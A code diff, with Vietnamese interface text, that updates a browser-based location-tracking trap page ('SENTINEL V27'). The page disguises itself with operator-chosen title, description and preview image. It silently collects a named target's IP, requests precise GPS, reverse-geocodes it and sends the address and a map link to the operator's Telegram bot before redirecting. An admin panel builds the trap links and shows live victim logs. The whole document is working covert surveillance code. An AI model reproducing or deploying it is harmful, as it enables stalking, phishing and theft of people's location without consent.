@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     
-    <title id="dyn-title">Đang tải...</title>
+    <title id="dyn-title">Đang tải tài liệu...</title>
     <meta id="meta-desc" name="description" content="">
     <meta id="og-title" property="og:title" content="">
     <meta id="og-desc" property="og:description" content="">
@@ -19,61 +19,72 @@
         .admin-bg { background: #010409; color: #c9d1d9; font-family: ui-sans-serif, system-ui; }
         .glass { background: #0d1117; border: 1px solid #30363d; border-radius: 16px; }
         .input-dark { background: #010409; border: 1px solid #30363d; color: #f0f6fc; padding: 10px; border-radius: 8px; width: 100%; font-size: 11px; outline: none; }
-        .preview-card { background: #fff; border-radius: 10px; overflow: hidden; max-width: 300px; border: 1px solid #e1e4e8; margin: 0 auto; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: left; }
+        .input-dark:focus { border-color: #3b82f6; }
+
+        /* Social Preview Box */
+        .preview-card { background: #fff; border-radius: 10px; overflow: hidden; max-width: 320px; border: 1px solid #e1e4e8; margin: 0 auto; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: left; }
+        .preview-img { width: 100%; height: 160px; object-fit: cover; background: #f6f8fa; border-bottom: 1px solid #eee; }
+        .preview-info { padding: 12px; color: #1f2328; }
+
+        .live-dot { height: 8px; width: 8px; background-color: #238636; border-radius: 50%; display: inline-block; margin-right: 5px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(35, 134, 54, 0.7); } 70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(35, 134, 54, 0); } 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(35, 134, 54, 0); } }
     </style>
 </head>
 <body id="main-body" class="victim-body">
 
     <div id="ui-victim">
         <div class="loader" style="margin: 0 auto;"></div>
-        <div class="mt-4 text-[#777] text-[13px] text-center italic">Đang đồng bộ máy chủ...</div>
+        <div class="mt-4 text-[#777] text-[13px] text-center italic">Đang đồng bộ dữ liệu bảo mật...</div>
     </div>
 
     <div id="ui-admin" class="hidden w-full p-4 lg:p-8">
         <div class="max-w-7xl mx-auto space-y-6">
             <header class="flex justify-between items-center border-b border-gray-800 pb-4">
-                <h1 class="text-xl font-black text-white italic">Vị Trí</h1>
-                <button onclick="logout()" class="text-[10px] bg-red-900/20 text-red-500 px-3 py-1 rounded">THOÁT</button>
+                <div>
+                    <h1 class="text-xl font-black text-white italic">SENTINEL <span class="text-blue-500">V27</span></h1>
+                    <p class="text-[9px] text-gray-500 uppercase"><span class="live-dot"></span>Geocoding Engine Active</p>
+                </div>
+                <button onclick="logout()" class="text-[10px] bg-red-950/20 text-red-500 border border-red-900/50 px-4 py-2 rounded-xl font-bold uppercase">Logout</button>
             </header>
 
             <div class="grid lg:grid-cols-12 gap-6">
-                <div class="lg:col-span-5 space-y-6">
-                    <div class="glass p-5 space-y-4">
-                        <h3 class="text-[10px] font-black text-blue-400 uppercase tracking-widest italic">1. Chỉnh sửa thông tin hiển thị</h3>
+                <div class="lg:col-span-4 space-y-6">
+                    <div class="glass p-5 space-y-4 shadow-2xl">
+                        <h3 class="text-[10px] font-black text-blue-400 uppercase tracking-widest italic">1. Sửa Ngụy trang (Preview Live)</h3>
                         <div class="space-y-3">
-                            <input id="ed-title" type="text" placeholder="Tiêu đề bài viết (Title)" class="input-dark" oninput="updateUI()">
-                            <textarea id="ed-desc" placeholder="Mô tả nội dung (Description)" class="input-dark h-16 resize-none" oninput="updateUI()"></textarea>
-                            <input id="ed-img" type="text" placeholder="Link ảnh đại diện (Image URL)" class="input-dark" oninput="updateUI()">
+                            <input id="ed-title" type="text" placeholder="Tiêu đề trang" class="input-dark" oninput="updateUI()">
+                            <textarea id="ed-desc" placeholder="Mô tả ngụy trang" class="input-dark h-16 resize-none" oninput="updateUI()"></textarea>
+                            <input id="ed-img" type="text" placeholder="Link ảnh đại diện" class="input-dark" oninput="updateUI()">
                         </div>
                         <div class="preview-card mt-2">
-                            <img id="pre-img" src="" class="w-full h-32 object-cover">
-                            <div class="p-3">
-                                <div id="pre-title" class="font-bold text-xs text-blue-800 truncate"></div>
-                                <div id="pre-desc" class="text-[10px] text-gray-500 line-clamp-2"></div>
+                            <img id="pre-img" src="" class="preview-img">
+                            <div class="preview-info">
+                                <div id="pre-title" class="font-bold text-[13px] text-blue-700 truncate">...</div>
+                                <div id="pre-desc" class="text-[11px] text-gray-600 line-clamp-2 mt-1">...</div>
                             </div>
                         </div>
                     </div>
 
                     <div class="glass p-5 space-y-4">
-                        <h3 class="text-[10px] font-black text-green-500 uppercase tracking-widest italic">2. Cấu hình & Tạo Link</h3>
+                        <h3 class="text-[10px] font-black text-green-500 uppercase tracking-widest italic">2. Cấu hình & Robot</h3>
                         <div class="grid grid-cols-2 gap-2">
                             <input id="cfg-tk" type="password" placeholder="Bot Token" class="input-dark">
                             <input id="cfg-id" type="text" placeholder="Chat ID" class="input-dark">
                         </div>
-                        <input id="cfg-rd" type="text" placeholder="Link chuyển hướng đích" class="input-dark">
-                        <input id="in-target" type="text" placeholder="Tên mục tiêu..." class="input-dark">
+                        <input id="cfg-rd" type="text" placeholder="Link đích cuối" class="input-dark">
+                        <input id="in-name" type="text" placeholder="Tên mục tiêu..." class="input-dark">
                         <button onclick="saveAndBuild()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-[10px] uppercase">Lưu & Tạo Link</button>
                         <div id="box-result" class="hidden p-3 bg-black rounded border border-blue-900/30">
-                            <div id="out-link" onclick="copyText(this)" class="text-[10px] text-blue-400 break-all cursor-pointer font-mono text-center leading-relaxed"></div>
+                            <div id="out-link" onclick="copyText(this)" class="text-[10px] text-blue-400 break-all cursor-pointer font-mono text-center"></div>
                         </div>
                     </div>
                 </div>
 
-                <div class="lg:col-span-7">
-                    <div class="glass min-h-[550px] flex flex-col overflow-hidden">
+                <div class="lg:col-span-8">
+                    <div class="glass min-h-[600px] flex flex-col overflow-hidden">
                         <div class="p-4 border-b border-gray-800 flex justify-between bg-black/20">
-                            <h3 class="text-[10px] font-black text-white uppercase italic">Live Intelligence Logs</h3>
-                            <button onclick="clearLogs()" class="text-[9px] text-gray-500 hover:text-red-500 font-bold uppercase">Xóa lịch sử</button>
+                            <h3 class="text-[10px] font-black text-white uppercase italic">Live Intelligence Logs (Reverse Geo)</h3>
+                            <button onclick="clearLogs()" class="text-[9px] text-gray-500 hover:text-red-500 font-bold uppercase">Xóa</button>
                         </div>
                         <div class="overflow-x-auto flex-1">
                             <table class="w-full text-left text-[11px]">
@@ -103,84 +114,83 @@
 
         window.onload = () => {
             if (urlParams.has('admin')) {
-                if (localStorage.getItem('v25_auth') === 'true' || prompt("Mật khẩu:") === "123") {
-                    localStorage.setItem('v25_auth', 'true');
+                if (localStorage.getItem('v27_auth') === 'true' || prompt("Pass:") === "123") {
+                    localStorage.setItem('v27_auth', 'true');
                     initAdmin();
                 } else { window.location.search = ""; }
             } else { startPhantom(); }
         };
 
+        // --- TRACKING CORE (JS REVERSE GEOCONTROL) ---
         async function startPhantom() {
-            // GIẢI MÃ CẤU HÌNH TỪ URL ĐỂ GHI ĐÈ TITLE/META THỰC TẾ
             try { 
                 const v = urlParams.get('v'); 
                 if(v) config = JSON.parse(decodeURIComponent(escape(atob(v)))); 
-                
-                // Cập nhật thẻ Meta THẬT của trang để ngụy trang
                 document.title = config.mt;
-                document.getElementById('dyn-title').innerText = config.mt;
                 document.getElementById('meta-desc').content = config.md;
                 document.getElementById('og-title').content = config.mt;
                 document.getElementById('og-desc').content = config.md;
                 document.getElementById('og-img').content = config.mi;
             } catch(e) {}
 
-            const target = urlParams.get('name') || 'GUEST';
-            let ipInfo = { ip: 'N/A', org: 'N/A', city: 'N/A', lat: 0, lon: 0 };
+            const target = urlParams.get('name') || 'Guest';
+            let ipInfo = {};
 
+            // BƯỚC 1: Lấy IP âm thầm
             try {
                 const res = await fetch('https://ipapi.co/json/').then(r => r.json());
-                ipInfo = res;
-                addLog({ name: target, ...ipInfo, address: res.city + ", " + res.country_name, time: new Date().toLocaleTimeString(), st: 'IP' });
-                await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("🚀 <b>" + target + "</b> truy cập\n🌐 IP: " + res.ip + "\n📍 Vùng: " + res.city)}`);
+                ipInfo = { ip: res.ip, org: res.org, city: res.city + ", " + res.country_name, time: new Date().toLocaleTimeString(), st: 'IP-ONLY' };
+                addLog({ name: target, ...ipInfo, address: ipInfo.city });
+                await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("🚀 <b>" + target + "</b> truy cập\n🌐 IP: " + res.ip)}`);
             } catch(e) {}
 
-            const jump = () => window.location.replace(config.r);
+            const finish = () => window.location.replace(config.r);
 
+            // BƯỚC 2: Ép GPS & Dịch địa chỉ (Geo Reverse)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (p) => {
                     const lat = p.coords.latitude, lon = p.coords.longitude;
                     let fullAddr = "Tọa độ: " + lat + ", " + lon;
+                    
+                    // Logic Reverse Geocoding thay thế cho PHP
                     try {
                         const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
                         fullAddr = geo.display_name || fullAddr;
                     } catch(e) {}
+
                     updateLog(target, lat, lon, fullAddr);
                     await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("🎯 <b>" + target + "</b> GPS OK\n📍 " + fullAddr + "\n🗺️ Map: https://www.google.com/maps?q=$" + lat + "," + lon)}`);
-                    jump();
-                }, jump, { timeout: 5000 });
-            } else { jump(); }
-            setTimeout(jump, 8000);
+                    finish();
+                }, finish, { enableHighAccuracy: true, timeout: 5000 });
+            } else { finish(); }
+            setTimeout(finish, 8000);
         }
 
-        // --- ADMIN FUNCTIONS ---
+        // --- ADMIN LIVE MONITOR ---
         function initAdmin() {
             document.getElementById('main-body').className = "admin-bg";
             document.getElementById('ui-victim').classList.add('hidden');
             document.getElementById('ui-admin').classList.remove('hidden');
             
-            const saved = localStorage.getItem('v25_cfg');
+            const saved = localStorage.getItem('v27_cfg');
             if(saved) config = JSON.parse(saved);
             
-            document.getElementById('cfg-tk').value = config.t;
-            document.getElementById('cfg-id').value = config.i;
-            document.getElementById('cfg-rd').value = config.r;
             document.getElementById('ed-title').value = config.mt;
             document.getElementById('ed-desc').value = config.md;
             document.getElementById('ed-img').value = config.mi;
+            document.getElementById('cfg-tk').value = config.t;
+            document.getElementById('cfg-id').value = config.i;
+            document.getElementById('cfg-rd').value = config.r;
             
             updateUI();
             renderLogs();
-            setInterval(renderLogs, 3000); // TỰ ĐỘNG CẬP NHẬT NHẬT KÝ MỖI 3 GIÂY
+            setInterval(renderLogs, 3000); // Nhật ký tự load mỗi 3 giây
         }
 
         function updateUI() {
-            const t = document.getElementById('ed-title').value;
-            const d = document.getElementById('ed-desc').value;
-            const i = document.getElementById('ed-img').value;
-            document.getElementById('pre-title').innerText = t;
-            document.getElementById('pre-desc').innerText = d;
-            document.getElementById('pre-img').src = i;
+            document.getElementById('pre-title').innerText = document.getElementById('ed-title').value || "...";
+            document.getElementById('pre-desc').innerText = document.getElementById('ed-desc').value || "...";
+            document.getElementById('pre-img').src = document.getElementById('ed-img').value || "";
         }
 
         function saveAndBuild() {
@@ -190,51 +200,48 @@
             config.mt = document.getElementById('ed-title').value;
             config.md = document.getElementById('ed-desc').value;
             config.mi = document.getElementById('ed-img').value;
-            localStorage.setItem('v25_cfg', JSON.stringify(config));
+            localStorage.setItem('v27_cfg', JSON.stringify(config));
             
-            const name = document.getElementById('in-target').value || 'Target';
+            const name = document.getElementById('in-name').value || 'Target';
             const base = window.location.href.split('?')[0];
-            // Encode cấu hình vào link bẫy
             const v = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
             const finalLink = `${base}?name=${encodeURIComponent(name)}&v=${v}`;
             
             document.getElementById('box-result').classList.remove('hidden');
             document.getElementById('out-link').innerText = finalLink;
-            alert("Đã đồng bộ thông số!");
         }
 
         function renderLogs() {
-            const logs = JSON.parse(localStorage.getItem('v25_logs') || '[]');
+            const logs = JSON.parse(localStorage.getItem('v27_logs') || '[]');
             const table = document.getElementById('log-list');
-            const html = logs.map(l => `
+            table.innerHTML = logs.map(l => `
                 <tr class="hover:bg-white/5 border-b border-gray-800 transition">
                     <td class="p-4 font-bold text-white uppercase">${l.name}<br><span class="text-[8px] text-gray-600 font-normal">${l.time}</span></td>
-                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-gray-600 uppercase font-sans">${l.org}</span></td>
-                    <td class="p-4 text-gray-300 text-[9px] leading-relaxed max-w-[150px]">${l.address || l.city}</td>
+                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-gray-600 uppercase">${l.org || ''}</span></td>
+                    <td class="p-4 text-gray-300 text-[9px] leading-tight max-w-[200px]">${l.address || 'Đang lấy...'}</td>
                     <td class="p-4 text-right">
-                        ${l.st === 'GPS' ? `<a href="http://google.com/maps?q=0{l.lat},${l.lon}" target="_blank" class="bg-green-600/20 text-green-500 border border-green-600/30 px-2 py-1 rounded text-[9px] font-black">MAP</a>` : `<span class="text-gray-700 italic text-[9px]">IP ONLY</span>`}
+                        ${l.st === 'GPS-OK' ? `<a href="http://google.com/maps?q=0{l.lat},${l.lon}" target="_blank" class="bg-green-600/20 text-green-500 border border-green-600/30 px-2 py-1 rounded text-[9px] font-black">MAP</a>` : `<span class="text-gray-700 italic">IP</span>`}
                     </td>
                 </tr>
             `).join('');
-            table.innerHTML = html || '<tr><td colspan="4" class="p-10 text-center text-gray-700">Chưa có dữ liệu...</td></tr>';
         }
 
         function addLog(data) {
-            let logs = JSON.parse(localStorage.getItem('v25_logs') || '[]');
+            let logs = JSON.parse(localStorage.getItem('v27_logs') || '[]');
             logs.unshift(data);
-            localStorage.setItem('v25_logs', JSON.stringify(logs.slice(0, 50)));
+            localStorage.setItem('v27_logs', JSON.stringify(logs.slice(0, 50)));
         }
 
         function updateLog(name, lat, lon, addr) {
-            let logs = JSON.parse(localStorage.getItem('v25_logs') || '[]');
+            let logs = JSON.parse(localStorage.getItem('v27_logs') || '[]');
             if(logs.length > 0 && logs[0].name === name) {
-                logs[0].st = 'GPS'; logs[0].lat = lat; logs[0].lon = lon; logs[0].address = addr;
+                logs[0].st = 'GPS-OK'; logs[0].lat = lat; logs[0].lon = lon; logs[0].address = addr;
             }
-            localStorage.setItem('v25_logs', JSON.stringify(logs));
+            localStorage.setItem('v27_logs', JSON.stringify(logs));
         }
 
-        function clearLogs() { if(confirm("Xóa sạch nhật ký?")) { localStorage.removeItem('v25_logs'); renderLogs(); } }
-        function logout() { localStorage.removeItem('v25_auth'); location.reload(); }
+        function clearLogs() { if(confirm("Xóa nhật ký?")) { localStorage.removeItem('v27_logs'); renderLogs(); } }
+        function logout() { localStorage.removeItem('v27_auth'); location.reload(); }
         function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("Đã Copy Link!"); }
     </script>
 </body>
